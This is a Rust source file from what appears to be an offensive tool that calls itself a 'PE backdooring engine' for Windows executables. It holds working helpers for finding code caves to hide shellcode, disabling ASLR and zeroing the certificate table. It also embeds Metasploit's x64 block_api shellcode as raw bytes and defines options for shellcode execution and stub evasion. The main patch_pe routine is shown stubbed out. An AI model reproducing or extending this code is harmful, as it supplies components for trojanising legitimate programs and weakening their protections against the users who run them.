//! PE (Portable Executable) backdooring engine
//!
//! Supports:
//! - PE header parsing and information extraction
//! - Code cave discovery
//! - ASLR disable, certificate table zeroing
#![allow(dead_code)]

use super::evasion::StubEvasion;
use super::{find_caves, CodeCave};
use anyhow::{anyhow, Result};
use goblin::pe::PE;

/// PE file information
#[derive(Debug)]
pub struct PeInfo {
    pub is_64bit: bool,
    pub machine_type: u16,
    pub entry_point: u64,
    pub image_base: u64,
    pub section_alignment: u32,
    pub file_alignment: u32,
    pub number_of_sections: u16,
    pub size_of_image: u32,
    pub size_of_headers: u32,
    pub cert_table_offset: u64,
    pub cert_table_size: u32,
}

/// Thread wait strategy after shellcode execution in the stub
#[derive(Debug, Clone)]
pub enum ThreadWait {
    None,
    WaitInfinite,
    Sleep(u32),
}

/// Execution technique for the stub
#[derive(Debug, Clone)]
pub enum ExecutionTechnique {
    Direct,
    CreateThread,
}

impl std::fmt::Display for ExecutionTechnique {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Direct => write!(f, "direct"),
            Self::CreateThread => write!(f, "create_thread"),
        }
    }
}

impl ExecutionTechnique {
    pub fn from_str(s: &str) -> Result<Self> {
        match s {
            "direct" | "func_ptr" => Ok(Self::Direct),
            "create_thread" => Ok(Self::CreateThread),
            _ => Err(anyhow!(
                "Unknown technique: '{}'. Community edition supports: direct, create_thread",
                s
            )),
        }
    }

    pub fn list() -> &'static [&'static str] {
        &["direct", "create_thread"]
    }

    pub fn is_synchronous(&self) -> bool {
        matches!(self, Self::Direct)
    }
}

/// Options for PE patching
#[derive(Debug, Clone)]
pub struct PatchPeOptions {
    pub add_section: bool,
    pub section_name: String,
    pub min_cave_size: usize,
    pub disable_aslr: bool,
    pub zero_cert: bool,
    pub thread_wait: ThreadWait,
    pub execution_technique: ExecutionTechnique,
    pub evasion: StubEvasion,
}

impl Default for PatchPeOptions {
    fn default() -> Self {
        Self {
            add_section: false,
            section_name: ".sdata".to_string(),
            min_cave_size: 380,
            disable_aslr: true,
            zero_cert: true,
            thread_wait: ThreadWait::None,
            execution_technique: ExecutionTechnique::CreateThread,
            evasion: StubEvasion::default(),
        }
    }
}

/// Main orchestrator: patch a PE binary with shellcode
///
/// Patch a PE binary with shellcode (not implemented)
pub fn patch_pe(_data: &[u8], _shellcode: &[u8], _options: &PatchPeOptions) -> Result<Vec<u8>> {
    Err(anyhow!("PE patching with stub generation is not available in this build"))
}

/// Gather PE file information from parsed headers
pub fn gather_pe_info(pe: &PE, _data: &[u8]) -> Result<PeInfo> {
    let header = &pe.header;
    let optional = header
        .optional_header
        .ok_or_else(|| anyhow!("No optional header"))?;

    let is_64bit = optional.standard_fields.magic == 0x20B;

    let (cert_offset, cert_size) =
        if let Some(data_dirs) = optional.data_directories.get_certificate_table() {
            (data_dirs.virtual_address as u64, data_dirs.size)
        } else {
            (0, 0)
        };

    Ok(PeInfo {
        is_64bit,
        machine_type: header.coff_header.machine,
        entry_point: optional.standard_fields.address_of_entry_point as u64,
        image_base: optional.windows_fields.image_base,
        section_alignment: optional.windows_fields.section_alignment,
        file_alignment: optional.windows_fields.file_alignment,
        number_of_sections: header.coff_header.number_of_sections,
        size_of_image: optional.windows_fields.size_of_image,
        size_of_headers: optional.windows_fields.size_of_headers,
        cert_table_offset: cert_offset,
        cert_table_size: cert_size,
    })
}

/// Find code caves in PE sections
pub fn find_pe_caves(pe: &PE, data: &[u8], min_size: usize) -> Vec<CodeCave> {
    let mut all_caves = Vec::new();

    for (idx, section) in pe.sections.iter().enumerate() {
        let name = String::from_utf8_lossy(&section.name)
            .trim_end_matches('\0')
            .to_string();
        let start = section.pointer_to_raw_data as usize;
        let raw_size = section.size_of_raw_data as usize;
        let va = section.virtual_address;

        if start + raw_size > data.len() || raw_size == 0 {
            continue;
        }

        let section_data = &data[start..start + raw_size];
        let mut caves = find_caves(section_data, min_size);

        for cave in &mut caves {
            let offset_in_section = cave.start;
            cave.section_name = name.clone();
            cave.section_index = idx;
            cave.start += start as u64;
            cave.end += start as u64;
            cave.virtual_address = va as u64 + offset_in_section;
        }

        all_caves.extend(caves);
    }

    all_caves
}

/// Disable ASLR by clearing DYNAMIC_BASE flag in DllCharacteristics
pub fn disable_aslr(data: &mut [u8], pe: &PE) -> Result<()> {
    let pe_offset = pe.header.dos_header.pe_pointer as usize;
    let dll_char_offset = pe_offset + 24 + 0x46;
    if dll_char_offset + 2 <= data.len() {
        let current = u16::from_le_bytes([data[dll_char_offset], data[dll_char_offset + 1]]);
        let new_val = current & !0x40;
        data[dll_char_offset..dll_char_offset + 2].copy_from_slice(&new_val.to_le_bytes());
    }
    Ok(())
}

/// Standard Metasploit ror13 block_api resolver for x64 (192 bytes).
///
/// This is used by the resolver module for the Ror13 hash algorithm variant.
#[rustfmt::skip]
pub static BLOCK_API: [u8; 192] = [
    0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48,
    0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a,
    0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9,
    0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xf1, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c,
    0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
    0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff,
    0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41,
    0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45,
    0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c,
    0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
    0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
    0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff,
];

/// Zero out the certificate table pointer
pub fn zero_cert_table(data: &mut [u8], pe: &PE) -> Result<()> {
    let pe_offset = pe.header.dos_header.pe_pointer as usize;
    let optional_offset = pe_offset + 24;

    let is_64bit = pe
        .header
        .optional_header
        .map(|h| h.standard_fields.magic == 0x20B)
        .unwrap_or(false);

    let cert_dir_offset = if is_64bit {
        optional_offset + 144
    } else {
        optional_offset + 128
    };

    if cert_dir_offset + 8 <= data.len() {
        for i in 0..8 {
            data[cert_dir_offset + i] = 0;
        }
    }

    Ok(())
}
